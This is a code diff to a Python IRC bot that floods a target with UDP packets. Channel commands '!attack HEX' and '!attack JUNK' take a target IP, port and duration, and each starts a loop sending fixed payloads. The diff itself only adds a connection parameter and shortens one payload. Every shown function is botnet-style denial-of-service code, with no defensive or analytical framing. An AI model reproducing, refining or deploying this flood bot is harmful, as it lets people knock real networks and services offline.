@@ -27,7 +27,7 @@ class SimpleBot(irc.bot.SingleServerIRCBot):
                 ip = params[2]
                 port = int(params[3])
                 duration = int(params[4])
-                self.attack_hex(ip, port, duration)
+                self.attack_hex(connection, ip, port, duration)
             else:
                 connection.privmsg(self.channel, "Usage: !attack HEX <ip> <port> <duration>")
         
@@ -37,11 +37,11 @@ class SimpleBot(irc.bot.SingleServerIRCBot):
                 ip = params[2]
                 port = int(params[3])
                 duration = int(params[4])
-                self.attack_junk(ip, port, duration)
+                self.attack_junk(connection, ip, port, duration)
             else:
                 connection.privmsg(self.channel, "Usage: !attack JUNK <ip> <port> <duration>")
 
-    def attack_hex(self, ip, port, duration):
+    def attack_hex(self, connection, ip, port, duration):
         end_time = time.time() + duration
         payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
         while time.time() < end_time:
@@ -54,9 +54,9 @@ class SimpleBot(irc.bot.SingleServerIRCBot):
             s.sendto(payload, (ip, port))
             s.close()
 
-    def attack_junk(self, ip, port, duration):
+    def attack_junk(self, connection, ip, port, duration):
         end_time = time.time() + duration
-        payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+        payload = b'\x00' * 64
         while time.time() < end_time:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             s.sendto(payload, (ip, port))
